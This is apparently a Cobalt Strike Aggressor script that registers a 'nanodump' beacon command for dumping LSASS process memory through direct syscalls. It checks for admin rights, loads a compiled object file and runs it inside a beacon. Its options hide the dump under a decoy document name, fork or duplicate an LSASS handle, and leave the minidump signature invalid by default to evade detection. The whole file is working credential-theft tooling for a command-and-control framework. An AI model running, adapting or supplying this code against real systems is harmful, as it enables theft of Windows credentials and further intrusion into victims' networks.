
beacon_command_register(
"nanodump",
"Use syscalls to dump LSASS.",
"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--fork] [--dup]");
alias nanodump {
    local('$barch $handle $data $args $pid $cname $dump_name $write_file $use_valid_sig $fork $dup $i');

    $barch = barch($1);
    if($barch eq "x86")
    {
        berror($1, "Nanodump does not support x86");
        return;
    }

    ## make sure the beacon is not WoW64
    #$barch = barch($1);
    #$is64 = binfo($1, "is64");
    #if($barch eq "x86" && $is64 == 1)
    #{
    #    berror($1, "Nanodump does not support WoW64");
    #    return;
    #}

    # reading lsass requires elevated privileges
    if(!-isadmin $1)
    {
        berror($1, "You need to be admin to run nanodump.");
        return;
    }

    # read in the BOF file
    $handle = openf(script_resource("compiled/nanodump." . $barch . ".o"));
    $data = readb($handle, -1);
    closef($handle);
    if(strlen($data) == 0)
    {
        berror($1, "could not read bof file");
        return;
    }

    # by default, nanodump will find the PID of LSASS dinamically
    $pid = 0;
    # name of the dump when downloaded fileless
    $cname = beacon_info($1, "computer");
    $time = int(ticks() / 1000);
    $dump_name = $cname . "_" . $time . "_lsass.dmp";
    # by default, download the minidump fileless
    $write_file = 0;
    # by default, do not fork the target process
    $fork = 0;
    # by default, do not duplicate an LSASS handle
    $dup = 0;
    # by default, the signature of the minidump is invalid
    $use_valid_sig = 0;
    for ($i = 1; $i < size(@_); $i++)
    {
        if (@_[$i] eq "--pid" || @_[$i] eq "-p")
        {
            # set the PID of LSASS
            $i++;
            $pid = @_[$i];
        }
        else if (@_[$i] eq "--write" || @_[$i] eq "-w")
        {
            # set the path where the minidump will be written to disk
            $write_file = 1;
            $i++;
            $dump_name = @_[$i];
        }
        else if (@_[$i] eq "--fork" || @_[$i] eq "-f")
        {
            # set arg to true for process forking
            $fork = 1;
        }
        else if (@_[$i] eq "--dup" || @_[$i] eq "-d")
        {
            # set arg to true for handle duplication
            $dup = 1;
        }
        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
        {
            # use a valid signature for the minidump
            $use_valid_sig = 1;
        }
        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
        {
            berror($1, beacon_command_detail("nanodump"));
            return;
        }
        else
        {
            berror($1, "invalid argument: " . @_[$i]);
            return;
        }
    }

    if($fork == 1 && $dup == 1)
    {
        berror($1, "Cannot set both --fork and --dup.");
        return;
    }

    # check if --fork was enabled with no PID
    if($fork == 1 && $pid == 0)
    {
        berror($1, "The option --fork requires a PID.");
        return;
    }

    # check if --dup was enabled with no PID
    if($dup == 1 && $pid == 0)
    {
        berror($1, "The option --dup requires a PID.");
        return;
    }

    # pack the arguments
    $args = bof_pack($1, "iziiii", $pid, $dump_name, $write_file, $use_valid_sig, $fork, $dup);

    # run
    btask($1, "Running NanoDump");
    beacon_inline_execute($1, $data, "go", $args);
}
